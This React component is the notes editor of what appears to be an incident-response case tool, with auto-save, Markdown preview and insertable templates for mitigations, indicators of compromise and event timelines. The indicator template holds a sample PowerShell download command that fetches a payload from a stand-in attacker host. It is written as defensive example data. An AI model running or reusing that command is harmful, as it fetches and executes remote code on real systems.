import React, { useState, useEffect, useRef } from "react";
import { CaseNote, TimelineEvent } from "../types";
import { FileEdit, Eye, FileCheck, RefreshCw, BookmarkPlus, Heading3, ClipboardList } from "lucide-react";

interface NotesEditorProps {
  caseId: string;
  notes: CaseNote;
  caseEvents: TimelineEvent[];
  onSaveNotes: (content: string) => void;
}

export default function NotesEditor({
  caseId,
  notes,
  caseEvents,
  onSaveNotes,
}: NotesEditorProps) {
  const [content, setContent] = useState(notes?.content || "");
  const [activeTab, setActiveTab] = useState<"write" | "preview">("write");
  const [isSaving, setIsSaving] = useState(false);
  const saveTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const lastSyncedCaseIdRef = useRef<string | null>(null);
  const contentRef = useRef(content);

  // Keep contentRef updated with the absolute latest local state
  useEffect(() => {
    contentRef.current = content;
  }, [content]);

  // Sync content with notes when case ID shifts or first loads
  useEffect(() => {
    if (notes && lastSyncedCaseIdRef.current !== caseId) {
      setContent(notes.content || "");
      lastSyncedCaseIdRef.current = caseId;
    }
  }, [caseId, notes]);

  // Handle typing auto-save triggers with debounce
  const handleContentChange = (val: string) => {
    setContent(val);
    setIsSaving(true);

    if (saveTimeoutRef.current) {
      clearTimeout(saveTimeoutRef.current);
    }

    saveTimeoutRef.current = setTimeout(() => {
      onSaveNotes(val);
      setIsSaving(false);
    }, 1200); // 1.2 second debounce
  };

  // Safe cleanup - immediately saves pending changes on unmount
  useEffect(() => {
    return () => {
      if (saveTimeoutRef.current) {
        clearTimeout(saveTimeoutRef.current);
        onSaveNotes(contentRef.current);
      }
    };
  }, [onSaveNotes]);

  const selectMacroInjection = (type: string) => {
    let injectionText = "";
    if (type === "mitigation") {
      injectionText = `\n### 🛡️ Recommended Mitigations Checklist:\n- [ ] Rotate compromised user VPN session keys immediately.\n- [ ] Block host outgoing egress traffic targeting external cloud storage IP space.\n- [ ] Enforce conditional domain group access rules.`;
    } else if (type === "ioc") {
      injectionText = `\n### 🧬 Identified Indicators of Compromise (IoC):\n- **IP Space**: VPN Proxy ingress (origin: residential proxy block)\n- **Host Binaries**: C:\\Users\\Public\\Downloads\\network_scan.exe\n- **Decoded Command String**: \`DownloadString('http://attacker.xyz/payload.ps1')\``;
    } else if (type === "events") {
      const formattedEvents = caseEvents.map(e => `* **[${e.timestamp.substr(11, 5) || e.timestamp}]** ${e.event} (${e.severity})`).join("\n");
      injectionText = `\n### 📅 Chronological Sequence Map:\n${formattedEvents || "*No events mapped yes.*"}`;
    }

    const newContent = content + injectionText;
    handleContentChange(newContent);
  };

  // Super lightweight Markdown renderer to support basic styling (bold, header, bullet lists, code) safely without compiling issues
  const renderSimpleMarkdown = (text: string) => {
    if (!text) return <p className="text-slate-400 italic">No notes created yet. Select 'Write' tag to compile investigation details.</p>;

    const lines = text.split("\n");
    return lines.map((line, idx) => {
      // Headers
      if (line.startsWith("# ")) {
        return <h1 key={idx} className="text-xl font-extrabold text-slate-900 border-b border-slate-200 pb-2.5 mt-5 mb-3 font-sans">{line.replace("# ", "")}</h1>;
      }
      if (line.startsWith("## ")) {
        return <h2 key={idx} className="text-base font-bold text-slate-800 mt-4 mb-2 font-sans">{line.replace("## ", "")}</h2>;
      }
      if (line.startsWith("### ")) {
        return <h3 key={idx} className="text-sm font-extrabold text-slate-700 mt-3 mb-1.5 font-sans">{line.replace("### ", "")}</h3>;
      }
      // Bullet list item
      if (line.startsWith("- [ ] ") || line.startsWith("- [x] ")) {
        const checked = line.startsWith("- [x]");
        return (
          <div key={idx} className="flex items-center gap-2 text-xs text-slate-600 my-1">
            <input type="checkbox" checked={checked} readOnly className="rounded border-slate-300 text-violet-600 focus:ring-violet-500" />
            <span className={checked ? "line-through text-slate-400" : ""}>{line.substr(6)}</span>
          </div>
        );
      }
      if (line.startsWith("- ") || line.startsWith("* ")) {
        return <li key={idx} className="text-xs text-slate-600 ml-4 list-disc my-1">{line.substring(2)}</li>;
      }
      // Trigger bold and backticks
      let processedString: React.ReactNode = line;
      if (line.includes("**")) {
        const parts = line.split("**");
        processedString = parts.map((part, pIdx) => pIdx % 2 === 1 ? <strong key={pIdx} className="font-extrabold text-[#111827]">{part}</strong> : part);
      }

      // Default line paragraph
      return <p key={idx} className="text-xs text-slate-600 leading-relaxed min-h-[1rem] my-1">{processedString}</p>;
    });
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between border-b border-slate-100 pb-2">
        <h4 className="text-[12px] uppercase tracking-wider font-extrabold text-slate-400 flex items-center gap-1.5">
          <FileEdit className="h-4 w-4 text-violet-500" /> Forensic Log Notepad
        </h4>
        
        {/* Saving State and Tab bar */}
        <div className="flex items-center gap-2">
          <span className="text-[10px] font-mono text-slate-400 flex items-center gap-1 text-[10px]">
            {isSaving ? (
              <>
                <RefreshCw className="h-3 w-3 animate-spin text-violet-500" /> Auto-saving...
              </>
            ) : (
              <>
                <FileCheck className="h-3 w-3 text-emerald-500" /> Auto-saved
              </>
            )}
          </span>
          
          <div className="flex bg-slate-100 rounded-lg p-0.5 text-[10.5px] font-bold border border-slate-200">
            <button
              id="tab-note-write"
              onClick={() => setActiveTab("write")}
              className={`px-3 py-1 rounded-md transition-all ${
                activeTab === "write" ? "bg-white text-slate-800 shadow-sm" : "text-slate-400 hover:text-slate-600"
              }`}
            >
              Write
            </button>
            <button
              id="tab-note-preview"
              onClick={() => setActiveTab("preview")}
              className={`px-3 py-1 rounded-md transition-all ${
                activeTab === "preview" ? "bg-white text-slate-800 shadow-sm" : "text-slate-400 hover:text-slate-600"
              }`}
            >
              Preview
            </button>
          </div>
        </div>
      </div>

      {/* Editor Panel Block */}
      {activeTab === "write" ? (
        <div id="notes-write-block" className="space-y-3">
          <textarea
            id="notes-textarea-input"
            value={content}
            onChange={(e) => handleContentChange(e.target.value)}
            placeholder="# Active Workstation Incident Log..."
            className="w-full h-80 text-xs font-mono p-4 border border-slate-200 rounded-2xl focus:outline-none focus:ring-1 focus:ring-violet-500 bg-white shadow-inner resize-none leading-relaxed"
          />

          {/* Quick Macro Templates bar */}
          <div className="space-y-1.5 pt-1">
            <span className="text-[10.5px] font-bold text-slate-400 uppercase tracking-widest block mb-1">Incorporate Template Macros:</span>
            <div className="flex flex-wrap gap-2 text-[10px] font-bold">
              <button
                id="macro-mitigation-inject"
                onClick={() => selectMacroInjection("mitigation")}
                className="px-2.5 py-1.5 bg-violet-100/60 hover:bg-violet-100 text-violet-700 rounded-lg border border-violet-200/50 transition-colors flex items-center gap-1 cursor-pointer"
              >
                <BookmarkPlus className="h-3 w-3" /> Mitigations Checklist
              </button>
              <button
                id="macro-ioc-inject"
                onClick={() => selectMacroInjection("ioc")}
                className="px-2.5 py-1.5 bg-amber-50 hover:bg-amber-100 text-amber-700 rounded-lg border border-amber-200/50 transition-colors flex items-center gap-1 cursor-pointer"
              >
                <Heading3 className="h-3 w-3" /> Indicators of Compromise
              </button>
              <button
                id="macro-events-inject"
                onClick={() => selectMacroInjection("events")}
                className="px-2.5 py-1.5 bg-emerald-50 hover:bg-emerald-100 text-emerald-800 rounded-lg border border-emerald-200/50 transition-colors flex items-center gap-1 cursor-pointer"
              >
                <ClipboardList className="h-3 w-3" /> Sequence Map
              </button>
            </div>
          </div>
        </div>
      ) : (
        <div 
          id="notes-preview-block" 
          className="w-full h-96 overflow-y-auto p-5 border border-slate-200 rounded-2xl bg-white leading-relaxed space-y-2 select-text"
        >
          {renderSimpleMarkdown(content)}
        </div>
      )}
    </div>
  );
}
